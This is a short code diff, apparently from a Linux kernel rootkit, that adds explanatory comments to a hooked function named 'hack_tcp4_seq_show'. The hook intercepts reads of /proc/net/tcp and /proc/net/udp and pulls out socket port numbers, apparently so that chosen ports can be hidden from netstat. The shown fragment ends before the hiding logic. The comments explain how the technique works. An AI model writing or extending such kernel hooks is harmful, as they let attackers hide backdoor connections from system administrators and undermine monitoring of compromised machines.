@@ -5,13 +5,17 @@
 
     #include "linked_list.h"
 
-
+/* tcp4_seq_show is called to read from a sequence file, /proc/net/tcp and /proc/net/udp,
+   sequence files are files containing a large dataset, those specificaly are what ports are being used in the system,
+   displayed by netstat. seq_file is a structure, like file_operations, enabling us to access the fields we want in the dataset.
+   also passed is void *v , a pointer to an address in the file, containig a sock struct, representing a socket,
+   the rest of the functions are for udp and ipv6 for tcp and udp, same implementation*/
 static asmlinkage long hack_tcp4_seq_show(struct seq_file *seq, void *v){
     struct sock *sk;
     long ret;
     char port[6];
 
-    if (v != SEQ_START_TOKEN){
+    if (v != SEQ_START_TOKEN){ // check that we are not at the start of the file containing the port table headers
         sk = (struct sock *)v;
         snprintf(port, 6, "%d", (int)sk->sk_num);
 
